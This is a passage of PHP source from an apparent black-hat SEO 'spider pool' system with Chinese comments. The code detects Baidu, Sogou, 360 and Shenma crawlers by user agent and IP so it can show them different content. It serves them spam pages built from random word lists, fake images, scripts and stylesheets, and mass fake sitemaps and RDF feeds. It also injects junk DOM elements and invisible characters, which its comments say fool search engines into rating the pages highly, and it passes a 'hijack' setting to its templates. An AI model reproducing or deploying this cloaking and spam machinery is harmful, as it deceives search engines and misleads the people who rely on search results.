        //当前文件找一个词库
        $path=Storage::disk('local')->path('txtinfo/'.$this->ua);
        //扫描目录下的所有文件
        $fileDir=scandir($path);
        //定义一个数组接收文件名
        $conname=[];
        foreach($fileDir as $v){
            // 跳过两个特殊目录 continue跳出循环
            if($v==="."||$v===".."){
                continue;
            }
            array_push($conname,$path.'/'.$v);
        }
        $words=file($conname[mt_rand(0,count($conname)-1)]);
        if(config('app.diy.associate')){
            $title=$this->getTitle(str_replace(config('app.diy.deluri'),'',$this->fileName));
        }else{
            $title=$this->chooseFile(config('app.diy.templatetitle')[$this->ua],md5($this->fileName),'不打开里面得文件');//获取属于当前域名得后缀类型。R就是地址，T就是词。
            //循环地址
            preg_match_all('/TITLE/i',$title,$matches);
            for($i=0;$i<count($matches[0]);$i++){
                $c=str_replace("\n",'',$words[mt_rand(0,count($words)-1)]);
                $c=str_replace("\r",'',$c);
                $title=preg_replace('/TITLE/i',$c,$title,1);
            }
            $title=preg_replace('/ADDRESS/i',$this->chooseFile(config('app.diy.address'),md5($this->fileName),'不打开里面得文件'),$title);
        }
        $keywords=$title;
        $description=config('app.diy.description');
        if(config('app.diy.keywords')){
            $keywords='';
            for($i=0;$i<(int)config('app.diy.keywords');$i++){
                if(config('app.diy.associate')){
                    $keywords=$keywords.$this->getTitle(str_replace(config('app.diy.deluri'),'',$this->fileName.$num++));
                }else{
                    $c=str_replace("\n",'',$words[mt_rand(0,count($words)-1)]);
                    $c=str_replace("\r",'',$c);
                    $keywords=$keywords.$c;
                }
            }
        }
        if($description){
            $description=str_replace("{NEWS}",$this->chooseFile(Storage::disk('local')->path('txtinfo/title'),md5($this->fileName)),$description);
            $description=str_replace("{TITLE}",$title,$description);
            preg_match('/{\d+}/',$description,$count);
            if(!empty($count[0])){
                preg_match('/\d+/',$count[0],$frequency);
                $str='';
                for($i=0;$i<(int)$frequency[0];$i++){
                    if(config('app.diy.associate')){
                        $str=$str.$this->getTitle(str_replace(config('app.diy.deluri'),'',$this->fileName.$num++));
                    }else{
                        $c=str_replace("\n",'',$words[mt_rand(0,count($words)-1)]);
                        $c=str_replace("\r",'',$c);
                        $str=$str.$c;
                    }
                }
                $description=str_replace('{'.$frequency[0].'}',$str,$description);
            }
        }
        $data=[
            'title'=>$title,
            'keywords'=>$keywords,
            'description'=>$description ,
            'content'=>$content,
            'firstDomain'=>$this->firstDomain,
            'host'=>'//'.$this->host,
            'hijack'=>config('app.diy.hijack'),
            'pinyin'=>$pinyin,
            'uri'=>$_SERVER['REQUEST_URI'],
            'type'=>$type,
            'anthor'=>$anthor,
            'media'=>$media
        ];
        return view('template.'.$type.'.'.$name.'.'.$file,$data)->__toString();
    }
    //url得随机字符
    protected function urlformat($firstDomain,$pinyin){
        $port=$_SERVER['SERVER_PORT'];
        $randPort='';
        if((int)$port!==80){
            $randPort=':'.mt_rand(config('app.diy.port')[0],config('app.diy.port')[1]);
        }
        $address=config('app.diy.address');
        $urlformat=config('app.diy.urlformat')[$this->ua];
        $format=$urlformat[mt_rand(0,count($urlformat)-1)];
        preg_match_all('/{.*?}/',$format,$matches);
        foreach($matches[0] as $match){
            if($match==='{address}'&&!empty($address)){
                $where=$address[mt_rand(0,count($address)-1)];
                $wherePy=implode('',$pinyin->convert($where,PINYIN_NO_TONE));
            }elseif($match==='{time}'){
                $wherePy=date('Ymd');
            }else{
                preg_match('/\d+/',$match,$num);
                $wherePy=$this->randStr($num[0]);
            }
            $format=preg_replace('/'.'\\'.$match.'/',$wherePy,$format,1);
        }
        $format=str_replace('Y',$firstDomain.$randPort,$format);
        return str_replace('HOST',$this->host.$randPort,$format);
    }
    //在body节点里面新加干扰码
    protected function interference($nodes,$dom,$interference){
        /*$dom=new \DOMDocument();
        libxml_use_internal_errors(true);
        $dom->loadHTML($template);
        $nodes=$dom->getElementsByTagName('body');
        $this->interference($nodes[0],$dom,$interference);
        $template=$dom->saveHTML();//前面的这几行是其他地方调用的*/
        $attribute=['lang','draggable','dropzone','dir','date-time'];
        foreach($nodes->childNodes as $node){
            if($node->nodeType===XML_TEXT_NODE||$node->nodeName==='li'){
                continue;
            }
            if($node->nodeType===XML_ELEMENT_NODE){
                for($i=0;$i<3;$i++){
                    $result=array_shift($interference);
                    array_push($interference,$result);
                    $result1=array_shift($attribute);
                    array_push($attribute,$result1);
                    $index=$dom->createElement($result);
                    $url=$dom->createAttribute($result1);
                    $patch=$dom->createTextNode($this->randStr(mt_rand(4,6)));
                    $url->appendChild($patch);
                    $index->appendChild($url);
                    $nodes->insertBefore($index,$node);
                }
                $this->interference($node,$dom,$interference);
            }
        }
    }
    //根据md5选择指定文件，并根据算法有规律得返回一个文件内容
    protected function chooseFile($path,$md5,$open=''){
        //如果path是数组，则直接传过来得是数据，不需要找文件
        if(is_array($path)){
            $conname=$path;
        }else{
            //扫描目录下的所有文件
            $fileDir=scandir($path);
            //定义一个数组接收文件名
            $conname=[];
            foreach($fileDir as $v){
                // 跳过两个特殊目录 continue跳出循环
                if($v==="."||$v===".."){
                    continue;
                }
                array_push($conname,$path.'/'.$v);
            }
        }
        $md5=preg_replace('/[a|b]/i',0,$md5);
        $md5=preg_replace('/[c|d]/i',1,$md5);
        $md5=preg_replace('/[e|f]/i',2,$md5);
        $md5=preg_replace('/[g|h]/i',3,$md5);
        $md5=preg_replace('/[i|j]/i',4,$md5);
        $md5=preg_replace('/[k|l]/i',5,$md5);
        $md5=preg_replace('/[m|n]/i',6,$md5);
        $md5=preg_replace('/[o|p]/i',7,$md5);
        $md5=preg_replace('/[q|r]/i',8,$md5);
        $md5=preg_replace('/[s|t]/i',9,$md5);
        //获取md5得数字，根据数字来选择文件及具体行数
        preg_match_all('/\d+/',$md5,$arr);
        if(count($arr[0])){
            $md5=implode('',$arr[0]);
        }else{
            $md5=0;
        }
        //循环数组得数字是否存在文件
        $choose=str_split($md5,1);
        //有多少个文件
        $count=count($conname);
        if(empty($count)){
            return '';
        }
        //是否为真，则返回路径地址。
        if($open){
            $num=$this->subscript($choose,$count);
            if($num!==''){
                return str_replace(PHP_EOL,'',str_replace("\r",'',$conname[$num]));
            }
        }
        $file=file($conname[$this->subscript($choose,$count)]);
        //根据md5得到文件
        if(empty($file)){
            return '';
        }
        $str=str_replace(PHP_EOL,'',$file[$this->subscript($choose,count($file))]);
        return str_replace("\r",'',$str);
    }
    //根据算法有规律得返回一个文件内容或文件得行数，$md5是唯一标识，$count是当前文件内容或者当前目录下所有文件得行数
    protected function subscript($md5,$count){
        $num='';
        //获取选择指定文件的下标
        for($i=0;$i<count($md5);$i++){
            //如果我当前得md5小于总文件数得下标才行
            if($num.$md5[$i]<$count){
                $num=$num.$md5[$i];
                if(strlen($num)===strlen($count)){
                    break;
                }
            }
        }
        //如果文件夹大于1位数，也就是说文件不超过10个。说明下标可以为0，但是如果大于十个，但是第一位数十0，则需要去除，
        if(strlen($count)>1||empty($num)){
            $num=ltrim($num,0);
            //如果出现多次00，那么就下标得等于0
            if(empty($num)){
                $num=0;
            }
        }
        return $num;
    }
    //如果是蜘蛛访问不存在的图片或者jscss的话
    protected function jcp(){
        //如果访问不存在的图片则随机分配一个图片给蜘蛛
        if(preg_match('/.*(\.png|\.jpg|\.jpeg|\.gif|\.ico)/i',$_SERVER['REQUEST_URI'])){
            $pic=File::files(public_path('/storage/images'));
            $path=$pic[mt_rand(0,count($pic)-1)];
            header("Content-type: image/png");
            return readfile($path);
        }
        //如果访问不存在的JS则给蜘蛛,有可能是.JSP,所以还需要判断一下
        if(preg_match('/.*(\.js)/i',$_SERVER['REQUEST_URI'])){
            if(!stristr($_SERVER['REQUEST_URI'],'.jsp')){
                return readfile(public_path('/baidu.js'));
            }
        }
        //如果访问不存在的css则给蜘蛛
        if(preg_match('/.*(\.css)/i',$_SERVER['REQUEST_URI'])){
            return readfile(public_path('/style.css'));
        }
    }
    //获取是否是手机
    protected function isMobile(){
        //如果有HTTP_X_WAP_PROFILE则一定是移动设备
        if(isset($_SERVER['HTTP_X_WAP_PROFILE'])){
            return true;
        }
        //如果via信息含有wap则一定是移动设备,部分服务商会屏蔽该信息
        if(isset($_SERVER['HTTP_VIA'])){
            return stristr($_SERVER['HTTP_VIA'],"wap")?true:false;// 找不到为flase,否则为TRUE
        }
        //判断手机发送的客户端标志,兼容性有待提高
        if(isset($_SERVER['HTTP_USER_AGENT'])){
            $clientkeywords = array(
                'nokia','sony','ericsson','mot','samsung','htc','sgh','lg','sharp','sie-','philips','panasonic','alcatel','lenovo','iphone','ipod','blackberry','meizu','android','netfront','symbian','ucweb','windowsce','palm','operamini','operamobi','openwave','nexusone','cldc','midp','wap','mobile'
            );
            //从HTTP_USER_AGENT中查找手机浏览器的关键字
            if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT']))) {
                return true;
            }
        }
        if(isset($_SERVER['HTTP_ACCEPT'])){//协议法，因为有可能不准确，放到最后判断
            // 如果只支持wml并且不支持html那一定是移动设备
            // 如果支持wml和html但是wml在html之前则是移动设备
            if((strpos($_SERVER['HTTP_ACCEPT'],'vnd.wap.wml')!==false)&&(strpos($_SERVER['HTTP_ACCEPT'],'text/html')===false||(strpos($_SERVER['HTTP_ACCEPT'],'vnd.wap.wml')<strpos($_SERVER['HTTP_ACCEPT'],'text/html')))){
                return true;
            }
        }
        return false;
    }
    //301重定向
    protected function notFound(){
        header("HTTP/1.1 404 Not Found");
        die;
    }
    //apche泛端口循环
    protected function cycle(){
        $str='';
        $min=config('app.diy.port')[0];
        $max=config('app.diy.port')[1];
        $content=config('app.diy.apacheport');
        for($i=$min;$i<=$max;$i++){
            $str=$str.'<VirtualHost *:'.$i.'>
                    '.$content.'
                </VirtualHost>'."\n";
        }
        echo $str;
    }
    //新增ascii码，因搜索引擎无法识别，所以会感觉你这个是高质量的东西
    protected function ascii($template){
        $isAscii=config('app.diy.ascii');
        //如果ascii不为空,并且是数组
        if(!empty($isAscii)&&is_array($isAscii)){
            $template=str_replace($isAscii,array_map(function ($item){
                $ascii=['','','',''];
                $ascii=$ascii[mt_rand(0,3)].$ascii[mt_rand(0,3)];
                return $ascii.$item;
            },$isAscii),$template);
        }
        return $template;
    }
    //unicode转码
    protected function unicode($txt){
        if(config('app.diy.unicode')){
            preg_match_all('/./u',$txt,$matches);
            $txt='';
            foreach($matches[0] as $v){
                $txt=$txt."&#".base_convert(bin2hex(iconv('UTF-8',"UCS-4",$v)),16,10).';';
            }
            return str_replace('&#13;','',$txt);
        }
        return $txt;
    }
    //获取是否是蜘蛛
    protected function getUa(){
        if(isset($_SERVER['HTTP_USER_AGENT'])){
            if(preg_match("/".config('app.diy.spider')."/",$_SERVER["HTTP_USER_AGENT"],$matches)){
                if($matches[0]==='Sogou'){
                    if(!preg_match("/spider/i",$_SERVER["HTTP_USER_AGENT"])){
                        return '';
                    }
                }
                return $matches[0];
            }
        }
        $reg='/((?:\d+\.){3})\d+/';
        $ip=rtrim(preg_replace($reg,'$1',$_SERVER['REMOTE_ADDR']),'.');
        $isSogou=in_array($ip,config('app.diy.sogou'));
        $is360=in_array($ip,config('app.diy.360'));
        $isBaidu=in_array($ip,config('app.diy.baidu'));
        $isShenma=in_array($ip,config('app.diy.shenma'));
        $ua='';
        if($isSogou){
            $ua='Sogou';
        }elseif($is360){
            $ua='360Spider';
        }elseif($isBaidu){
            $ua='Baiduspider';
        }elseif($isShenma){
            $ua='Yisou';
        }
        return $ua;
    }
    //生成随机字符串
    public function randStr($len){
        $chars=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9"];
        shuffle($chars);//打乱数组顺序
        $str='';
        for($i=0;$i<(int)$len;$i++){
            $str=$str.$chars[mt_rand(0,count($chars)-1)];//随机取出一位
        }
        return $str;
    }
    //xml地图生成
    protected function sitemap(){
        $pinyin=new Pinyin(MemoryFileDictLoader::class);
        $doc=new \DOMDocument('1.0','utf-8');
        //创建根节点
        $urlset=$doc->createElement("urlset");
        $urlset->setAttribute('xmlns','http://www.sitemaps.org/schemas/sitemap/0.9');
        if($this->ua==='Baiduspider'){
            $urlset->setAttribute('xmlns:mobile','http://www.baidu.com/schemas/sitemap-mobile/1/');
            //mobile移动网页;pc,mobile自适应网页;htmladapt代码适配无该上述标签表示为PC网页
            $type=['mobile','pc,mobile','htmladapt',''];
        }
        $date=date('Y-m-d');
        for($i=0;$i<(int)config('app.diy.sitemap');$i++){
            //创建第一个子节点
            $url=$doc->createElement("url");
            if($directory=config('app.diy.directory')){
                $count=count($directory);
                $locVal=$directory[mt_rand(0,$count-1)].$this->urlformat($this->firstDomain,$pinyin);
            }else{
                $locVal='http:'.$this->urlformat($this->firstDomain,$pinyin);
            }
            $loc=$doc->createElement("loc",$locVal);//http://www.yoursite.com/yoursite.html
            $url->appendChild($loc);//在父节点下面加入子节点
            if($this->ua==='Baiduspider'){
                $mobileType=$type[mt_rand(0,count($type)-1)];
                if(!empty($mobileType)){
                    $mobile=$doc->createElement("mobile:mobile");
                    $mobile->setAttribute('type',$mobileType);
                    $url->appendChild($mobile);
                }
            }
            $lastmod=$doc->createElement("lastmod",$date);
            $url->appendChild($lastmod);
            $changefreq=$doc->createElement("changefreq","always");
            $url->appendChild($changefreq);
            $priority=$doc->createElement("priority","1.0");
            $url->appendChild($priority);
            $urlset->appendChild($url);
        }
        //把根节点挂载在DOMDocument对象
        $doc->appendChild($urlset);
        header("Content-type:text/xml");
        //在页面上输出xml
        echo $doc->saveXML();
        die;
    }
    //通用得爬站并得到所有连接
    protected function curlAll($link){
        $ch=curl_init();//初始化
        curl_setopt($ch,CURLOPT_URL,str_replace([" ","\t","\r","\n"],'',$link));//这是你想用PHP取回的URL地址。你也可以在用curl_init()函数初始化时设置这个选项。
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);//如果成功只将结果返回，不自动输出任何内容。
        curl_setopt($ch,CURLOPT_INTERFACE,$_SERVER['SERVER_ADDR']);
        $source=curl_exec($ch);
        curl_close($ch);
        return explode(PHP_EOL,$source);
    }
    //rdf格式生成
    protected function rdf(){
        $pinyin=new Pinyin(MemoryFileDictLoader::class);
        $doc=new \DOMDocument('1.0','utf-8');
        //创建根节点
        $rdf=$doc->createElement("rdf:RDF");
        $rdf->setAttribute('xmlns:rdf','http://www.w3.org/1999/02/22-rdf-syntax-ns#');
        $rdf->setAttribute('xmlns:si','http://www.runoob.com/rdf/');
        $typePath=$this->chooseFile(resource_path('views/template'),md5($_SERVER['HTTP_HOST']),'不打开里面得文件');//得到哪个类型得模板路径
        if(empty($typePath)){
            return resource_path('views/template').'目录没有模板，要么尽快添加，要么更换模式';
        }
        $type=substr($typePath,strripos($typePath,'/')+1);//得到模板得类型
        for($i=0;$i<(int)config('app.diy.rdf');$i++){
            $data=$this->content($this->firstDomain,$pinyin,$type,'不执行互链');
            //创建第一个子节点
            $url=$doc->createElement("rdf:Description");
            if($directory=config('app.diy.directory')){
                $count=count($directory);
                $about=$directory[mt_rand(0,$count-1)].$data['url'];
            }else{
                $about='http:'.$data['url'];
            }
            $url->setAttribute('rdf:about',$about);
            $title=$doc->createElement("title",$data['title']);//http://www.yoursite.com/yoursite.html
            $url->appendChild($title);//在父节点下面加入子节点
            $author=$doc->createElement("author",$data['anthor']);
            $url->appendChild($author);
            $date=$doc->createElement("date",date('Y-m-d',strtotime('-'.$i.' day')));
            $url->appendChild($date);
            $article=$doc->createElement("description",$data['article']);
            $url->appendChild($article);
            $rdf->appendChild($url);
        }
        //把根节点挂载在DOMDocument对象
        $doc->appendChild($rdf);
        header("Content-type:text/xml");
        //在页面上输出xml
        echo $doc->saveXML();
        die;
    }
}
